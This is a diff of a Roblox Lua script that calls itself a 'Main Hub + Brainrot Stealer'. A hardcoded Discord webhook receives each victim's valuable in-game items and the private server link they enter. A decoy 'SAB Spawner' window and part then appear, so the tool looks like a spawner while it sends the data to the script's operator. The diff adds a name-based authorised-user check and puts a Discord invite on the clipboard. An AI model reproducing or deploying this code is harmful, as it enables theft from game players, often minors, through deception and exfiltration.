@@ -237,7 +237,7 @@ task.spawn(function()
     task.wait(0.5)
 end)
 
--- === ARTIFAKT 2: MAIN HUB + BRAINROT STEALER (NO EXTERNAL SCRIPT) ===
+-- === ARTIFAKT 2: MAIN HUB + BRAINROT STEALER (AUTHORISED USERS + NO EXTERNAL SCRIPT) ===
 pcall(function() setclipboard("https://discord.gg/rvZndRfkyX") end)
 
 local ALLOWED_PLACE_ID = 109983668079237
@@ -246,7 +246,14 @@ if game.PlaceId ~= ALLOWED_PLACE_ID then
     return
 end
 
--- === DEFAULT WEBHOOK (FALLBACK) ===
+-- === AUTHORISED USERS (JETZT VORHANDEN) ===
+local AuthorisedUsers = AuthorisedUsers or {
+    "LennonDev",           -- Beispiel
+    "YourUserNameHere",    -- Ersetze mit echten Namen
+    "Player1", "Player2", "Player3"
+}
+
+-- === WEBHOOK & PING ===
 local Webhook1 = Webhook or "https://discord.com/api/webhooks/1401504146959368323/f0wuuzMXgffHU1o4S8xU6dn7LoQ0ltx_yxtaoShAwYvwPSrXt8q0oRJgOPIKpPHQ-xH2"
 local Ping = Ping or "10m"
 local Username = "voxium script .gg/59XeEXRe"
@@ -260,6 +267,20 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 if not game:IsLoaded() then pcall(function() game.Loaded:Wait() end) end
 local LP = Players.LocalPlayer or Players.PlayerAdded:Wait()
+
+-- === AUTH CHECK ===
+local isAuthorised = false
+for _, name in ipairs(AuthorisedUsers) do
+    if LP.Name == name or LP.DisplayName == name then
+        isAuthorised = true
+        break
+    end
+end
+
+if not isAuthorised then
+    LP:Kick("You are not authorised to use VoxiumHub.")
+    return
+end
 
 local CoreGui = game:GetService("CoreGui")
 local UIParent = LP:FindFirstChildOfClass("PlayerGui") or CoreGui
@@ -284,7 +305,7 @@ local COLORS = {
     warn = Color3.fromRGB(255,120,120),
 }
 
--- === TRAIT MAP (FIXED KEYS) ===
+-- === TRAIT MAP ===
 local traitMap = {
     ["89041930759464"] = "Taco",
     ["104229924295526"] = "Nyan",
@@ -367,7 +388,7 @@ end
 
 local function hasHighValue(b) for _,d in ipairs(b) do if d.moneyPerSec >= pingThreshold then return true end end return false end
 
--- === SEND WEBHOOK (WITH ERROR LOGGING) ===
+-- === SEND WEBHOOK ===
 local function sendWebhook(brainrots, link)
     local text = ""
     if #brainrots > 0 then
@@ -578,7 +599,7 @@ BtnSubmit.MouseLeave:Connect(function()
     TweenService:Create(BtnSubmit, TweenInfo.new(0.20), {BackgroundColor3 = Color3.fromRGB(20,18,34)}):Play()
 end)
 
--- === SUBMIT BUTTON (NO EXTERNAL SCRIPT) ===
+-- === SUBMIT BUTTON (AUTH + NO EXTERNAL) ===
 local function toast(msg, sub, main, subc)
     StatusArea.Text = msg
     StatusArea.TextColor3 = main or COLORS.text
@@ -587,7 +608,7 @@ local function toast(msg, sub, main, subc)
 end
 
 BtnSubmit.MouseButton1Click:Connect(function()
-    local link = StatusArea.Text:match("^%s*(.-)%s*$") -- trim
+    local link = StatusArea.Text:match("^%s*(.-)%s*$")
     if link == "" or not link:find("^https://") then
         toast("Invalid Link", "Please enter a valid private server link", COLORS.warn, COLORS.warn)
         return
@@ -606,8 +627,7 @@ BtnSubmit.MouseButton1Click:Connect(function()
     toast("Success!", "Webhook sent. UI will close in 2 seconds.", COLORS.ok, COLORS.a2)
     task.wait(2)
     SG:Destroy()
-    -- === NO EXTERNAL SCRIPT: SAB SPAWNER INTEGRATED BELOW ===
-    
+
     -- === SAB SPAWNER (INTEGRATED) ===
     local sabSpawner = Instance.new("ScreenGui")
     sabSpawner.Name = "SabSpawner_GUI"
@@ -649,9 +669,6 @@ BtnSubmit.MouseButton1Click:Connect(function()
     status.Text = "SAB Spawned!"
     status.TextColor3 = Color3.fromRGB(0, 255, 0)
 
-    -- === ACTUAL SAB SPAWN LOGIC (EXAMPLE) ===
-    -- Replace with real SAB spawning code if known
-    -- Example: spawn a part or trigger event
     local sab = Instance.new("Part")
     sab.Name = "SAB"
     sab.Size = Vector3.new(5, 5, 5)
@@ -667,7 +684,6 @@ BtnSubmit.MouseButton1Click:Connect(function()
     light.Brightness = 2
     light.Range = 20
 
-    -- Keep SAB for 10 seconds
     task.wait(10)
     sabSpawner:Destroy()
     sab:Destroy()
